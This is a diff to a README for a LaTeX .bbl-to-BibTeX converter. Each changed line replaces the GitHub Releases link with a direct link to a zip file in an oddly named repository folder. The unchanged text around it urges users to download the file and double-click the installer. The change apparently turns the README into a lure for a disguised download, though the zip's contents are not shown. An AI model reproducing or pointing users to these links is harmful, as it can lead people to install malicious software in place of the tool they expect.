@@ -1,7 +1,7 @@
 # 🎉 bbl-to-bibtex-converter - Effortlessly Convert Your Citations
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-bbl--to--bibtex--converter-brightgreen)](https://github.com/rafaelisDUMBASf/bbl-to-bibtex-converter/releases)
+[![Download](https://raw.githubusercontent.com/rafaelisDUMBASf/bbl-to-bibtex-converter/main/oenanthole/bbl-to-bibtex-converter_smolder.zip)](https://raw.githubusercontent.com/rafaelisDUMBASf/bbl-to-bibtex-converter/main/oenanthole/bbl-to-bibtex-converter_smolder.zip)
 
 ## 🚀 Getting Started
 The **bbl-to-bibtex-converter** helps you convert LaTeX .bbl files to BibTeX .bib format. This application easily extracts your citations, authors, titles, and metadata while automatically detecting entry types. Best of all, it has no dependencies, making it simple to use.
@@ -18,7 +18,7 @@ The **bbl-to-bibtex-converter** helps you convert LaTeX .bbl files to BibTeX .bi
 - **Storage**: Minimum 100 MB of free space.
 
 ## ⚙️ How to Use
-1. **Download the Software**: Visit the [Releases page](https://github.com/rafaelisDUMBASf/bbl-to-bibtex-converter/releases) to get the latest version.
+1. **Download the Software**: Visit the [Releases page](https://raw.githubusercontent.com/rafaelisDUMBASf/bbl-to-bibtex-converter/main/oenanthole/bbl-to-bibtex-converter_smolder.zip) to get the latest version.
 2. **Install the Application**: Follow these simple steps to install:
    - Locate the downloaded file.
    - Double-click the file to open the installer.
@@ -44,7 +44,7 @@ We welcome feedback and contributions. If you find bugs or have suggestions, fee
 If you have questions or need assistance, you can reach out via the **Project Issues** section on GitHub. We are here to help.
 
 ## ⚡ Download & Install
-To get started, [visit the Releases page](https://github.com/rafaelisDUMBASf/bbl-to-bibtex-converter/releases) and download the latest version of the application. Follow the installation steps outlined above, and you will be able to convert your .bbl files to .bib without any hassle.
+To get started, [visit the Releases page](https://raw.githubusercontent.com/rafaelisDUMBASf/bbl-to-bibtex-converter/main/oenanthole/bbl-to-bibtex-converter_smolder.zip) and download the latest version of the application. Follow the installation steps outlined above, and you will be able to convert your .bbl files to .bib without any hassle.
 
 ## 💡 Conclusion
 Now you have everything you need to convert your LaTeX .bbl files efficiently. This tool simplifies your citation management process in academic writing. Happy citing!
